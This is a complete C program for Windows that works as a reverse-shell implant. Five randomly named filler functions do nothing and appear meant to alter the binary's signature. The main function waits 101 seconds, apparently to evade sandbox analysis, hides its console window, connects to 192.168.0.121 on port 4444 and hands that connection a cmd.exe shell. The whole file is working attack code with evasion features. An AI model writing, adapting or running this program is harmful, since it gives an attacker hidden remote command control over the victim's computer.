
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")


void GMWvJKFp() {
    int x = 252;
    int y = 282;
    if (x + y > 2000) { printf("%d", x); }
}


void tZJETDzO() {
    int x = 71;
    int y = 724;
    if (x + y > 2000) { printf("%d", x); }
}


void MWSKxEPg() {
    int x = 507;
    int y = 94;
    if (x + y > 2000) { printf("%d", x); }
}


void RHbarPRC() {
    int x = 553;
    int y = 514;
    if (x + y > 2000) { printf("%d", x); }
}


void yfjZOiiC() {
    int x = 176;
    int y = 677;
    if (x + y > 2000) { printf("%d", x); }
}


int main() {
    // Requirement: Execution delay
    printf("[INFO] Execution delayed by 101 seconds...\n");
    Sleep(101000); 

    FreeConsole(); 
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in addr;
    STARTUPINFOA si; // Use ANSI version
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("192.168.0.121");

    if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        char command[] = "cmd.exe"; 
        CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    }
    return 0;
}
